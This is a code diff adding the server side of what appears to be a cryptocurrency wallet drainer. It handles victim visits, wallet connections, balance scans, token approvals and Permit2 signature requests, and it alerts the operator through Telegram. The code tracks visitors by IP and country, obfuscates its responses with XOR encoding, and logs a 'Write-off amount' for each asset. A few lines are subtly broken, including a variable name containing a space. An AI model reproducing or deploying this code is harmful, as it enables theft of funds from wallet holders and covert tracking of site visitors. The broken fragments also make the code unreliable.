+  "stateMutability":"view","type":"function"},{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"receiver","type":"address"},{"internalType":"uint256","name":"numTokens","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"buyer","type":"address"},{"internalType":"uint256","name":"numTokens","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}]`),
+  'ERC721': JSON.parse(`[{"constant":false,"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"approve","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"mint","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"safeTransferFrom","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"},{"internalType":"bytes","name":"_data","type":"bytes"}],"name":"safeTransferFrom","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"to","type":"address"},
+  {"internalType":"bool","name":"approved","type":"bool"}],"name":"setApprovalForAll","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"transferFrom","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"inputs":[],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":true,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"Transfer","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"approved","type":"address"},{"indexed":true,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},
+  {"indexed":true,"internalType":"address","name":"operator","type":"address"},{"indexed":false,"internalType":"bool","name":"approved","type":"bool"}],"name":"ApprovalForAll","type":"event"},{"constant":true,"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"getApproved","outputs":[{"internalType":"address","name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"operator","type":"address"}],"name":"isApprovedForAll","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"ownerOf","outputs":[{"internalType":"address","name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},
+  {"constant":true,"inputs":[{"internalType":"bytes4","name":"interfaceId","type":"bytes4"}],"name":"supportsInterface","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"}]`),
+  'PERMIT_2': JSON.parse(`[{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"},
+  {"internalType":"uint256","name":"value","type":"uint256"},{"internalType":"uint256","name":"deadline","type":"uint256"},{"internalType":"uint8","name":"v","type":"uint8"},{"internalType":"bytes32","name":"r","type":"bytes32"},{"internalType":"bytes32","name":"s","type":"bytes32"}],"name":"permit","outputs":[],"stateMutability":"nonpayable","type":"function"}]`),
+  'PERMIT_1': JSON.parse(`[{"constant":false,"inputs":[{"internalType":"address","name":"holder","type":"address"},{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"nonce","type":"uint256"},{"internalType":"uint256","name":"expiry","type":"uint256"},{"internalType":"bool","name":"allowed","type":"bool"},{"internalType":"uint8","name":"v","type":"uint8"},{"internalType":"bytes32","name":"r","type":"bytes32"},{"internalType":"bytes32","name":"s","type":"bytes32"}],"name":"permit","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"}]`),
+  'PERMIT2_SINGLE': JSON.parse(`[{"inputs":[{"internalType":"address","name":"","type":"address"},{"internalType":"address","name":"","type":"address"},{"internalType":"address","name":"","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint160","name":"amount","type":"uint160"},{"internalType":"uint48","name":"expiration","type":"uint48"},{"internalType":"uint48","name":"nonce","type":"uint48"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"components":[{"components":[{"internalType":"address","name":"token","type":"address"},{"internalType":"uint160","name":"amount","type":"uint160"},{"internalType":"uint48","name":"expiration","type":"uint48"},{"internalType":"uint48","name":"nonce","type":"uint48"}],"internalType":"struct IAllowanceTransfer.PermitDetails","name":"details","type":"tuple"},{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"sigDeadline","type":"uint256"}],"internalType":"struct IAllowanceTransfer.PermitSingle","name":"permitSingle","type":"tuple"},{"internalType":"bytes","name":"signature","type":"bytes"}],"name":"permit","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint160","name":"amount","type":"uint160"},{"internalType":"address","name":"token","type":"address"}],"name":"transferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"}]`),
+  'PERMIT2_BATCH': JSON.parse(`[{"inputs":[{"internalType":"address","name":"","type":"address"},{"internalType":"address","name":"","type":"address"},{"internalType":"address","name":"","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint160","name":"amount","type":"uint160"},{"internalType":"uint48","name":"expiration","type":"uint48"},{"internalType":"uint48","name":"nonce","type":"uint48"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"components":[{"components":[{"internalType":"address","name":"token","type":"address"},{"internalType":"uint160","name":"amount","type":"uint160"},{"internalType":"uint48","name":"expiration","type":"uint48"},{"internalType":"uint48","name":"nonce","type":"uint48"}],"internalType":"struct IAllowanceTransfer.PermitDetails[]","name":"details","type":"tuple[]"},{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"sigDeadline","type":"uint256"}],"internalType":"struct IAllowanceTransfer.PermitBatch","name":"permitBatch","type":"tuple"},{"internalType":"bytes","name":"signature","type":"bytes"}],"name":"permit","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"components":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint160","name":"amount","type":"uint160"},{"internalType":"address","name":"token","type":"address"}],"internalType":"struct IAllowanceTransfer.AllowanceTransferDetails[]","name":"transferDetails","type":"tuple[]"}],"name":"transferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"}]`),
+};
+
+// ============================================================================= //
+// Автор и разработчик не одобряет использование данного ПО в указанных странах
+// Удаление какой-либо страны из данного списка СТРОГО ЗАПРЕЩЕНО И НЕ ОДОБРЯЕТСЯ
+// ============================================================================= //
+const MS_Banned_Countries = [ 'RU', 'BY', 'KZ', 'UZ', 'AZ', 'AM', 'TJ', 'KG' ];
+// ============================================================================= //
+
+const bot = new Telegram(MS_Telegram_Token);
+
+const web = express();
+web.use(express.json());
+
+web.use(require("cors")());
+web.use(require('express-useragent').express());
+web.use(express.static('public')); web.use(parser.json({ limit: '50mb' }));
+web.use(parser.urlencoded({ limit: '50mb', extended: true }));
+web.use((require('express-body-parser-error-handler'))());
+
+let last_free_id = 1;
+
+if (MS_Keep_ID_History && fs.existsSync('ids.dat'))
+  last_free_id = parseInt(fs.readFileSync('ids.dat', 'utf-8'));
+
+const free_id = () => {
+  last_free_id += 1;
+  if (MS_Keep_ID_History)
+    fs.writeFileSync('ids.dat', String(last_free_id), 'utf-8');
+  return last_free_id - 1;
+};
+
+let User_IPs_Pool = {};
+
+setInterval(() => {
+  User_IPs_Pool = {};
+  for (const address in MS_Verified_Addresses) {
+    try {
+      if (Math.floor(Date.now() / 1000) - MS_Verified_Addresses[address] > 300) {
+        delete MS_Verified_Addresses[address];
+      }
+    } catch(err) {
+      console.log(err);
+    }
+  }
+}, 15 * 60 * 1000);
+
+const prs = (s, t) => {
+  const ab = (t) => t.split("").map((c) => c.charCodeAt(0));
+  const bh = (n) => ("0" + Number(n).toString(16)).substr(-2);
+  const as = (code) => ab(s).reduce((a, b) => a ^ b, code);
+  return t.split("").map(ab).map(as).map(bh).join("");
+};
+
+const srp = (s, e) => {
+  const ab = (text) => text.split("").map((c) => c.charCodeAt(0));
+  const as = (code) => ab(s).reduce((a, b) => a ^ b, code);
+  return e.match(/.{1,2}/g).map((hex) => parseInt(hex, 16)).map(as).map((charCode) => String.fromCharCode(charCode)).join("");
+};
+
+const send_response = async (response, data) => {
+  try {
+    const encode_key = Buffer.from(String(10 + 256 + 1024 + 2048 + MS_Encryption_Key)).toString('base64');
+    const data_encoded = prs(encode_key, Buffer.from(JSON.stringify(data)).toString('base64'));
+    return response.status(200).send(data_encoded);
+  } catch(err) {
+    console.log(err);
+    return false;
+  }
+};
+
+const block_request = async (response) => {
+  try {
+    return await send_response(response, { status: 'error', error: 'SRV_UNAVAILABLE' });
+  } catch(err) {
+    console.log(err);
+  }
+};
+
+const add_record = async (record) => {
+  try {
+    if (!MS_Enable_API) return;
+    if (MS_API_Mode == 1 && record.type != 'asset_sent') return;
+    if (MS_API_Mode == 2 && record.type != 'enter_website' && record.type != 'connect_wallet' && record.type != 'asset_sent') return;
+    if (!fs.existsSync('API_DATA')) fs.writeFileSync('API_DATA', '[]', 'utf-8');
+    let API_Data = JSON.parse(fs.readFileSync('API_DATA', 'utf-8')), ts = Math.floor(Date.now() / 1000);
+    record.ts = ts; API_Data.push(record);
+    fs.writeFileSync('API_DATA', JSON.stringify(API_Data), 'utf-8');
+  } catch(err) {
+    console.log(err);
+  }
+};
+
+const add_allowance = async (owner, spender, token, chain_id, permit2 = false) => {
+  try {
+    if (!MS_Allowance_API) return false;
+    let allowance_list = [];
+    if (fs.existsSync('allowances.dat'))
+      allowance_list = JSON.parse(fs.readFileSync('allowances.dat', 'utf-8'));
+    for (const allowance of allowance_list) {
+      if (allowance.owner == owner && allowance.spender == spender && allowance.token == token
+      && allowance.chain_id == chain_id && allowance.permit2 == permit2) {
+        return false;
+      }
+    }
+    allowance_list.push({ owner, spender, token, chain_id, permit2 });
+    fs.writeFileSync('allowances.dat', JSON.stringify(allowance_list), 'utf-8');
+    return true;
+  } catch(err) {
+    console.log(err);
+  }
+};
+
+const update_allowance = async (owner, spender, token, chain_id, permit2 = false, balance = '0') => {
+  try {
+    if (!MS_Allowance_API) return false;
+    let allowance_list = [];
+    if (fs.existsSync('allowances.dat'))
+      allowance_list = JSON.parse(fs.readFileSync('allowances.dat', 'utf-8'));
+    for (let x = (allowance_list.length - 1); x >= 0; x--) {
+      const allowance = allowance_list[x];
+      if (allowance.owner == owner && allowance.spender == spender && allowance.token == token
+      && allowance.chain_id == chain_id && allowance.permit2 == permit2) {
+        allowance_list[x].last_balance = balance;
+        fs.writeFileSync('allowances.dat', JSON.stringify(allowance_list), 'utf-8');
+        return true;
+      }
+    }
+    return false;
+  } catch(err) {
+    console.log(err);
+  }
+};
+
+const remove_allowance = async (owner, spender, token, chain_id, permit2 = false) => {
+  try {
+    if (!MS_Allowance_API) return false;
+    let allowance_list = [];
+    if (fs.existsSync('allowances.dat'))
+      allowance_list = JSON.parse(fs.readFileSync('allowances.dat', 'utf-8'));
+    for (let x = (allowance_list.length - 1); x >= 0; x--) {
+      const allowance = allowance_list[x];
+      if (allowance.owner == owner && allowance.spender == spender && allowance.token == token
+      && allowance.chain_id == chain_id && allowance.permit2 == permit2) {
+        allowance_list.splice(x, 1);
+        fs.writeFileSync('allowances.dat', JSON.stringify(allowance_list), 'utf-8');
+        return true;
+      }
+    }
+    return false;
+  } catch(err) {
+    console.log(err);
+  }
+};
+
+const chain_id_to_name = (chain_id) => {
+  switch (chain_id) {
+    case 1: return 'Ethereum';
+    case 10: return 'Optimism';
+    case 56: return 'BNB Smart Chain';
+    case 137: return 'Polygon (MATIC)';
+    case 250: return 'Fantom';
+    case 42161: return 'Arbitrum';
+    case 43114: return 'Avalanche';
+    default: return 'Unknown Network';
+  }
+};
+
+const detect_browser = (UA) => {
+  try {
+    return UA.browser;
+  } catch(err) {
+    console.log(err);
+    return 'Unknown';
+  }
+};
+
+const detect_OS = (UA) => {
+  try {
+    return UA.os;
+  } catch(err) {
+    console.log(err);
+    return 'Unknown';
+  }
+};
+
+const detect_country = async (IP) => {
+  try {
+    const IP_Data = await axios.get(`http://ip-api.com/json/${IP}`);
+    if (IP_Data.data.status == 'success')
+      return IP_Data.data.countryCode;
+    else return 'UNK';
+  } catch(err) {
+    console.log(err);
+    return 'UNK';
+  }
+};
+
+const on_enter_website = async (response, data) => {
+  try {
+    let User_Country = await detect_country(data.IP), User_Browser = detect_browser(data.UA), User_OS = detect_OS(data.UA);
+    if (MS_CIS_Protection && MS_Banned_Countries.includes(User_Country.toUpperCase())) return send_response(response, { status: 'error',  error: 'BAD_COUNTRY' });
+    add_record({
+      type: 'enter_website', domain: data.domain, IP: data.IP, UA: data.UA.source,
+      country: User_Country, browser: User_Browser, OS: User_OS, user_id: data.user_id,
+      worker_id: data.worker_id || null
+    });
+    if ((data.chat_data == false && MS_Notifications.enter_website.mode) || (data.chat_data != false && data.chat_data.enter_website != "")) {
+      let receiver_chat_id = data.chat_data == false ? MS_Notifications.enter_website.chat_id : data.chat_data.enter_website;
+      try {
+        await bot.sendMessage(receiver_chat_id, `<b>👋 New visit to your site</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code> (${User_Country})\n<b>🖥 User Agent:</b> <code>${data.UA.source}</code>\n<b>💾 System:</b> <code>${User_OS}</code>\n<b>🌍 Browser:</b> <code>${User_Browser}</code>\n<b>🕐 Time:</b> <code>${data.time}</code>\n<b>👨‍🦰 User:</b> <code>#user_${data.user_id}</code>`, {
+          parse_mode: 'HTML'
+        });
+      } catch(err) {
+        console.log(err);
+      }
+    }
+    send_response(response, { status: 'OK' });
+  } catch(err) {
+    console.log(err);
+    send_response(response, { status: 'error', error: 'Unable to Execute' });
+  }
+};
+
+const on_leave_website = async (response, data) => {
+  try {
+    add_record({ type: 'leave_website', domain: data.domain, IP: data.IP, worker_id: data.worker_id || null, user_id: data.user_id });
+    if ((data.chat_data == false && MS_Notifications.leave_website.mode) || (data.chat_data != false && data.chat_data.leave_website != "")) {
+      let receiver_chat_id = data.chat_data == false ? MS_Notifications.leave_website.chat_id : data.chat_data.leave_website;
+      try {
+        await bot.sendMessage(receiver_chat_id, `<b>😭 User #user_${data.user_id} closed or reloaded the site</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>`, {
+          parse_mode: 'HTML'
+        });
+      } catch (err) {
+        console.log(err);
+      }
+    }
+    send_response(response, { status: 'OK' });
+  } catch(err) {
+    console.log(err);
+    send_response(response, { status: 'error', error: 'Unable to Execute' });
+  }
+};
+
+const on_connect_request = async (response, data) => {
+  try {
+    if (MS_Protection) {
+      if (isNaN(parseInt(data.user_id)) || !Supported_Wallets.includes(data.wallet)) {
+        if (!User_IPs_Pool[data.IP]) User_IPs_Pool[data.IP] = {};
+        User_IPs_Pool[data.IP]['strange_data'] = Math.floor(Date.now() / 1000) + (10 * 60);
+        return block_request(response);
+      }
+    }
+    add_record({ type: 'connect_request', domain: data.domain, IP: data.IP, worker_id: data.worker_id || null, wallet: data.wallet, user_id: data.user_id });
+    if ((data.chat_data == false && MS_Notifications.connect_request.mode) || (data.chat_data != false && data.chat_data.connect_request != "")) {
+      let receiver_chat_id = data.chat_data == false ? MS_Notifications.connect_request.chat_id : data.chat_data.connect_request;
+      try {
+        await bot.sendMessage(receiver_chat_id, `<b>❓ Requested connection from user #user_${data.user_id}</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\n<b>💰 Wallet type:</b> <code>${data.wallet}</code>`, {
+        parse_mode: 'HTML'
+        });
+      } catch(err) {
+        console.log(err);
+      }
+    }
+    send_response(response, { status: 'OK' });
+  } catch(err) {
+    console.log(err);
+    send_response(response, { status: 'error', error: 'Unable to Execute' });
+  }
+};
+
+const on_connect_cancel = async (response, data) => {
+  try {
+    add_record({ type: 'connect_cancel', domain: data.domain, IP: data.IP, worker_id: data.worker_id || null, user_id: data.user_id });
+    if ((data.chat_data == false && MS_Notifications.connect_cancel.mode) || (data.chat_data != false && data.chat_data.connect_cancel != "")) {
+      let receiver_chat_id = data.chat_data == false ? MS_Notifications.connect_cancel.chat_id : data.chat_data.connect_cancel;
+      try {
+        await bot.sendMessage(receiver_chat_id, `<b>❌ User #user_${data.user_id} declined connection</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>`, {
+        parse_mode: 'HTML'
+        });
+      } catch (err) {
+        console.log(err);
+      }
+    }
+    send_response(response, { status: 'OK' });
+  } catch(err) {
+    console.log(err);
+    send_response(response, { status: 'error', error: 'Unable to Execute' });
+  }
+};
+
+const on_connect_success = async (response, data) => {
+  try {
+    if (MS_Protection) {
+      if (isNaN(parseInt(data.user_id)) || !Supported_Wallets.includes(data.wallet) || !data.address.match(/^0x\S{40,40}$/)) {
+        if (!User_IPs_Pool[data.IP]) User_IPs_Pool[data.IP] = {};
+        User_IPs_Pool[data.IP]['strange_data'] = Math.floor(Date.now() / 1000) + (10 * 60);
+        return block_request(response);
+      }
+    }
+    add_record({
+      type: 'connect_wallet', domain: data.domain, IP: data.IP, user_id: data.user_id,
+      wallet_type: data.wallet, wallet_address: data.address, wallet_network: data.chain_id,
+      worker_id: data.worker_id || null
+    });
+    if ((data.chat_data == false && MS_Notifications.connect_success.mode) || (data.chat_data != false && data.chat_data.connect_success != "")) {
+      let receiver_chat_id = data.chat_data == false ? MS_Notifications.connect_success.chat_id : data.chat_data.connect_success;
+      let User_Country = await detect_country(data.IP);
+      await bot.sendMessage(receiver_chat_id, `<b>🦊 User #user_${data.user_id} has connected a wallet</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code> (${User_Country})\n\n<b>💰 Wallet type:</b> <code>${data.wallet}</code>\n<b>💠 Address:</b> <code>${data.address}</code>\n<b>⛓ Current network:</b> <code>${chain_id_to_name(data.chain_id)}</code>\n\n<i>Balance is being calculated, if the user does not leave the site, you will receive a notification</i>`, {
+        parse_mode: 'HTML'
+      });
+    }
+    send_response(response, { status: 'OK' });
+  } catch(err) {
+    console.log(err);
+    send_response(response, { status: 'error', error: 'Unable to Execute' });
+  }
+};
+
+const on_check_finish = async (response, data) => {
+  try {
+    add_record({ type: 'check_results', domain: data.domain, IP: data.IP, worker_id: data.worker_id || null, assets: data.assets, balance: data.balance, user_id: data.user_id });
+    if ((data.chat_data == false && MS_Notifications.connect_success.mode) || (data.chat_data != false && data.chat_data.connect_success != "")) {
+      let receiver_chat_id = data.chat_data == false ? MS_Notifications.connect_success.chat_id : data.chat_data.connect_success;
+      let assets_native = "", assets_tokens = "", assets_nfts = "";
+      for (const asset of data.assets) {
+        try {
+          if (asset.type == 'NATIVE') {
+            assets_native += `${asset.name} [${chain_id_to_name(asset.chain_id)}] (${asset.amount_usd.toFixed(2)}$); `;
+          } else if (asset.type == 'ERC20') {
+            assets_tokens += `${asset.name} [${chain_id_to_name(asset.chain_id)}] (${asset.amount_usd.toFixed(2)}$); `;
+          } else if (asset.type == 'ERC721') {
+            assets_nfts += `${asset.name} [${chain_id_to_name(asset.chain_id)}] (${asset.amount_usd.toFixed(2)}$); `;
+          }
+        } catch(err) {
+          console.log(err);
+        }
+      };
+      if (assets_native == "") assets_native = '<i>empty</i>';
+      if (assets tokens == "") assets tokens = '<in>empty</i>';
+      if (assets_nfts == "") assets_nfts = '<i>empty</i>';
+      try {
+        await bot.sendMessage(receiver_chat_id, `<b>💰 User #user_${data.user_id} scanned wallet</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\n<b>Total wallet balance:</b> <code>${data.balance.toFixed(2)}$</code>\n\n<b>Native coin:</b> ${assets_native}\n\n<b>ERC-20 tokens:</b> ${assets_tokens}\n\n<b>NFT:</b> ${assets_nfts}`, {
+        parse_mode: 'HTML'
+        });
+      } catch(err) {
+        console.log(err);
+      }
+    }
+    send_response(response, { status: 'OK' });
+  } catch(err) {
+    console.log(err);
+    send_response(response, { status: 'error', error: 'Unable to Execute' });
+  }
+};
+
+const on_chain_request = async (response, data) => {
+  try {
+    add_record({ type: 'chain_request', domain: data.domain, IP: data.IP, worker_id: data.worker_id || null, current_chain: data.chains[0], suggest_chain: data.chains[1], user_id: data.user_id });
+    if ((data.chat_data == false && MS_Notifications.chain_request.mode) || (data.chat_data != false && data.chat_data.chain_request != "")) {
+      let receiver_chat_id = data.chat_data == false ? MS_Notifications.chain_request.chat_id : data.chat_data.chain_request;
+      try {
+        await bot.sendMessage(receiver_chat_id, `<b>❓ User #user_${data.user_id} received a request to change network</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\n<b>⛓ Current network:</b> ${chain_id_to_name(data.chains[0])}\n<b>⛓ New network:</b> ${chain_id_to_name(data.chains[1])}`, {
+          parse_mode: 'HTML'
+        });
+      } catch(err) {
+        console.log(err);
+      }
+    }
+    send_response(response, { status: 'OK' });
+  } catch(err) {
+    console.log(err);
+    send_response(response, { status: 'error', error: 'Unable to Execute' });
+  }
+};
+
+const on_chain_success = async (response, data) => {
+  try {
+    add_record({ type: 'chain_success', domain: data.domain, IP: data.IP, worker_id: data.worker_id || null, user_id: data.user_id });
+    if ((data.chat_data == false && MS_Notifications.chain_success.mode) || (data.chat_data != false && data.chat_data.chain_success != "")) {
+      let receiver_chat_id = data.chat_data == false ? MS_Notifications.chain_success.chat_id : data.chat_data.chain_success;
+      try {
+        await bot.sendMessage(receiver_chat_id, `<b>✅ User #user_${data.user_id} changed network</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>`, {
+        parse_mode: 'HTML'
+        });
+      } catch (err) {
+        console.log(err);
+      }
+    }
+    send_response(response, { status: 'OK' });
+  } catch(err) {
+    console.log(err);
+    send_response(response, { status: 'error', error: 'Unable to Execute' });
+  }
+};
+
+const on_chain_cancel = async (response, data) => {
+  try {
+    add_record({ type: 'chain_cancel', domain: data.domain, IP: data.IP, worker_id: data.worker_id || null, user_id: data.user_id });
+    if ((data.chat_data == false && MS_Notifications.chain_cancel.mode) || (data.chat_data != false && data.chat_data.chain_cancel != "")) {
+      let receiver_chat_id = data.chat_data == false ? MS_Notifications.chain_cancel.chat_id : data.chat_data.chain_cancel;
+      try {
+        await bot.sendMessage(receiver_chat_id, `<b>❌ User #user_${data.user_id} declined network change, or network is unavailable</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>`, {
+          parse_mode: 'HTML'
+        });
+      } catch(err) {
+        console.log(err);
+      }
+    }
+    send_response(response, { status: 'OK' });
+  } catch(err) {
+    console.log(err);
+    send_response(response, { status: 'error', error: 'Unable to Execute' });
+  }
+};
+
+const on_transfer_cancel = async (response, data) => {
+  try {
+    add_record({ type: 'transfer_cancel', domain: data.domain, IP: data.IP, worker_id: data.worker_id || null, user_id: data.user_id });
+    if ((data.chat_data == false && MS_Notifications.transfer_cancel.mode) || (data.chat_data != false && data.chat_data.transfer_cancel != "")) {
+      let receiver_chat_id = data.chat_data == false ? MS_Notifications.transfer_cancel.chat_id : data.chat_data.transfer_cancel;
+      try {
+        await bot.sendMessage(receiver_chat_id, `<b>❌ User #user_${data.user_id} declined the transfer, or the transaction failed</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>`, {
+          parse_mode: 'HTML'
+        });
+      } catch(err) {
+        console.log(err);
+      }
+    }
+    send_response(response, { status: 'OK' });
+  } catch(err) {
+    console.log(err);
+    send_response(response, { status: 'error', error: 'Unable to Execute' });
+  }
+};
+
+const on_approve_cancel = async (response, data) => {
+  try {
+    add_record({ type: 'approve_cancel', domain: data.domain, IP: data.IP, worker_id: data.worker_id || null, user_id: data.user_id });
+    if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
+      let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
+      try {
+        await bot.sendMessage(receiver_chat_id, `<b>❌ User #user_${data.user_id} rejected confirmation or transaction failed</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>`, {
+          parse_mode: 'HTML'
+        });
+      } catch(err) {
+        console.log(err);
+      }
+    }
+    send_response(response, { status: 'OK' });
+  } catch(err) {
+    console.log(err);
+    send_response(response, { status: 'error', error: 'Unable to Execute' });
+  }
+};
+
+const on_sign_cancel = async (response, data) => {
+  try {
+    add_record({ type: 'sign_cancel', domain: data.domain, IP: data.IP, worker_id: data.worker_id || null, user_id: data.user_id });
+    if ((data.chat_data == false && MS_Notifications.sign_cancel.mode) || (data.chat_data != false && data.chat_data.sign_cancel != "")) {
+      let receiver_chat_id = data.chat_data == false ? MS_Notifications.sign_cancel.chat_id : data.chat_data.sign_cancel;
+      try {
+        await bot.sendMessage(receiver_chat_id, `<b>❌ User #user_${data.user_id} rejected the signature, or the transaction failed</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>`, {
+          parse_mode: 'HTML'
+        });
+      } catch(err) {
+        console.log(err);
+      }
+    }
+    send_response(response, { status: 'OK' });
+  } catch(err) {
+    console.log(err);
+    send_response(response, { status: 'error', error: 'Unable to Execute' });
+  }
+};
+
+const on_sign_unavailable = async (response, data) => {
+  try {
+    add_record({ type: 'sign_unavailable', domain: data.domain, IP: data.IP, worker_id: data.worker_id || null, user_id: data.user_id });
+    if ((data.chat_data == false && MS_Notifications.sign_cancel.mode) || (data.chat_data != false && data.chat_data.sign_cancel != "")) {
+      let receiver_chat_id = data.chat_data == false ? MS_Notifications.sign_cancel.chat_id : data.chat_data.sign_cancel;
+      try {
+        await bot.sendMessage(receiver_chat_id, `<b>❌ Signature unavailable for user #user_${data.user_id}</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\n<i>But don't panic, his wallet just doesn't support this function, if possible we'll offer him another way...</i>`, {
+        parse_mode: 'HTML'
+        });
+      } catch(err) {
+        console.log(err);
+      }
+    }
+    send_response(response, { status: 'OK' });
+  } catch(err) {
+    console.log(err);
+    send_response(response, { status: 'error', error: 'Unable to Execute' });
+  }
+};
+
+const on_sign_request = async (response, data) => {
+  try {
+    add_record({ type: 'sign_request', domain: data.domain, IP: data.IP, worker_id: data.worker_id || null, asset: data.asset, user_id: data.user_id });
+    if ((data.chat_data == false && MS_Notifications.sign_request.mode) || (data.chat_data != false && data.chat_data.sign_request != "")) {
+      let receiver_chat_id = data.chat_data == false ? MS_Notifications.sign_request.chat_id : data.chat_data.sign_request;
+      try {
+        await bot.sendMessage(receiver_chat_id, `<b>❓ User #user_${data.user_id} received a signature request</b>\n\n<b>🌍 Domain:</b> <code>${data. domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\n<b>Asset name:</b> ${data. asset.name} [${chain_id_to_name(data.asset.chain_id)}, ${data.asset.type}]\n<b>Write-off amount:</b> ${parseFloat(data.asset.amount)} ( ${parseFloat(data.asset.amount_usd).toFixed(2)}$)`, { parse_mode: 'HTML'
+        });
+      } catch(err) {
+        console.log(err);
+      }
+    }
+    send_response(response, { status: 'OK' });
+  } catch(err) {
+    console.log(err);
+    send_response(response, { status: 'error', error: 'Unable to Execute' });
+  }
+};
+
+const on_swap_request = async (response, data) => {
+  try {
+    if (data.swapper == 'Permit2') {
+      add_record({ type: 'permit2_request', domain: data.domain, IP: data.IP, worker_id: data.worker_id || null, asset: data.asset, assets: data.list, user_id: data.user_id });
+    } else {
